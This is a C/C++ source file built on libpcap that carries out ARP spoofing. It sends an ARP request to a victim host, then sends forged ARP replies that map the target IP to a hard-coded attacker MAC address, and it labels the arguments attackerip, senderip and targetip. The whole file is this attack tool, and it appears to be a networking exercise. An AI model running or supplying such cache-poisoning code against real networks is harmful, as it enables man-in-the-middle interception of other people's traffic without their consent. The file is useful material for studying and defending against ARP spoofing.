#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctype.h>
#include "struct.h"

struct ethernet eth;
struct arp arp;
struct ip ip;

void printchar(unsigned char c){
    if(isprint(c))
        printf("%c", c);
    else
        printf(".");
}

void dumpcode(unsigned char *buff, int len){
    int i;
    for(i=0;i<len;i++){
        if(i%16 == 0)
            printf("0x%08x", &buff[i]);

        printf("%02x ", buff[i]);

        if(i%16-15 == 0){
            int j;
            printf(" ");
            for(j=i-15;j<=i;j++)
                printchar(buff[j]);
            printf("\n");
        }
    }

    if(i%16 != 0){
        int j;
        int spaces=(len-i+16-i%16)*3+2;
        for(j=0;j<spaces;j++)
            printf(" ");
        for(j=i-i%16;j<len;j++)
            printchar(buff[j]);
    }
    printf("\n");
}

void make_ip(uint8_t* dest, char* ip){
    char* sptr = strtok(ip, ".");
    int i=0;
    while(sptr != NULL){
        dest[i] = atoi(sptr);
        sptr = strtok(NULL, ".");
        i++;
    }
}

void make_packet(u_char* ptr, uint8_t* smac, uint8_t* tmac, char* sip, char* tip, uint16_t opcode){
    struct ethernet* eth= reinterpret_cast<struct ethernet*>(ptr);
    if(opcode == 1){
        for(int i=0;i<6;i++){
            eth->descMac[i] = 0xff;
        }
    }else{
        for(int i=0;i<6;i++)
           eth->descMac[i] = tmac[i];
    }
    for(int i=0;i<6;i++)
        eth->srcMac[i] = smac[i];

    eth->ethType = htons(0x806);

    struct arp* arp = reinterpret_cast<struct arp*>(ptr=ptr+14);
    arp->hwType = htons(0x0001);
    arp->procType = htons(0x800);
    arp->hwSize = 0x06;
    arp->procSize = 0x4;
    arp->opcode = htons(opcode);
    for(int i=0;i<6;i++)
        arp->sendMac[i] = smac[i];
    make_ip(arp->sendIp, sip);
    if(opcode == 1){
        for(int i=0;i<6;i++)
            arp->targetMac[i] = 0x00;
    }else{
        for(int i=0;i<6;i++)
            arp->targetMac[i] = tmac[i];
    }
    make_ip(arp->targetIp, tip);
}

int main(int argc, char* argv[]){
    char* dev = argv[1];
    char* attackerip = argv[2];
    char* senderip = argv[3];
    char* targetip = argv[4];

    uint8_t smac[6] = {0x00,0x0c,0x29,0xb5,0x8e,0x5d};
    uint8_t tmac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[0x3c];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if(handle == NULL){
        fprintf(stderr, "couldn't open device %s: %s\n",dev, errbuf);
        return -1;
    }
        while(true){

        const u_char* recv;
        struct pcap_pkthdr* header;

        uint8_t recvtmac[6];
        int res = pcap_next_ex(handle, &header, &recv);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        printf("================Stage 1===============\n");
        printf("===============Request ARP============\n");
        make_packet(packet, smac, tmac, attackerip, senderip, 1);
        //sip = attacker ip // tip = senderip
        if(pcap_sendpacket(handle, packet, 0x3c) != 0)
            fprintf(stderr, "\nError Sending the packet: %s\n", pcap_geterr(handle));
        //dumpcode(packet, 0x3c);
        res = pcap_next_ex(handle, &header, &recv);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        for(int i=0;i<6;i++)
            recvtmac[i] = recv[i];
            printf("===============Reply ARP==============\n");
            make_packet(packet, recvtmac, smac, senderip, attackerip, 2);
            if(pcap_sendpacket(handle, packet, 0x3c) != 0)
                fprintf(stderr, "\nError Sending the packet: %s\n", pcap_geterr(handle));
            //dumpcode(packet, 0x3c);
            res = pcap_next_ex(handle, &header, &recv);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            if(!memcmp(recv,recvtmac, 6)){
                printf("================Stage 2===============\n");
                make_packet(packet, smac, recvtmac, targetip, senderip, 2);
                if(pcap_sendpacket(handle, packet, 0x3c) != 0)
                    fprintf(stderr, "\nError Sending the packet: %s\n", pcap_geterr(handle));
                //dumpcode(packet, 0x3c);
                //sleep(3);
                res = pcap_next_ex(handle, &header, &recv);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;
                if(!memcmp(packet, smac, 6)){
                    printf("================Stage 3===============\n");

                }
            }
            printf("=========================================\n");
        }

    pcap_close(handle);
    return 0;
}
